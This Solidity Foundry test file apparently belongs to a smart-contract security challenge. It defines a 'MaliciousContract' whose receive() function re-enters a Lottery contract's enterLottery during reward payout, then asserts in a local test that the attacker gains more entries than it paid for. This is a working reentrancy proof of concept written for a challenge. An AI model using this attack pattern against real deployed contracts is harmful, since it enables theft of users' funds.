// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Lottery} from "../src/challenge_2.sol";

contract MaliciousContract {
    Lottery public lottery;

    constructor(address _lottery) {
        lottery = Lottery(_lottery);
    }

    // Fallback function to receive ETH and re-enter the lottery contract
    receive() external payable {
        if (address(lottery).balance >= 1 ether) {
            lottery.enterLottery{value: 1 ether}();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        lottery.enterLottery{value: 1 ether}();
    }
}

contract LotteryTest is Test {
    Lottery lottery;
    MaliciousContract attacker;

    function setUp() public {
        lottery = new Lottery(address(this), 1 days);
        attacker = new MaliciousContract(address(lottery));
    }

    function testExploit() public {
        // Fund the malicious contract to make sure it has ETH to send
        payable(address(attacker)).transfer(1 ether);

        // Make the initial call to enter the lottery, should only allow for 1 entry based on payment
        attacker.attack{value: 1 ether}();

        // Simulate time passage to end the lottery
        skip(2 days);

        // Ensure the lottery has some ETH to distribute, mimicking other players' participation
        payable(address(lottery)).transfer(10 ether);

        // Trigger the distribution to exploit the vulnerability
        address[] memory rewardAddresses = new address[](1);
        rewardAddresses[0] = address(attacker);
        lottery.distributeRewards(rewardAddresses);

        // Specific assertion: Check if the malicious contract has more entries than its payment should allow
        uint256 maliciousEntries = lottery.entriesPerAddress(address(attacker));
        assertTrue(maliciousEntries > 1, "Exploit failed: Malicious contract should have increased entries");
    }
}
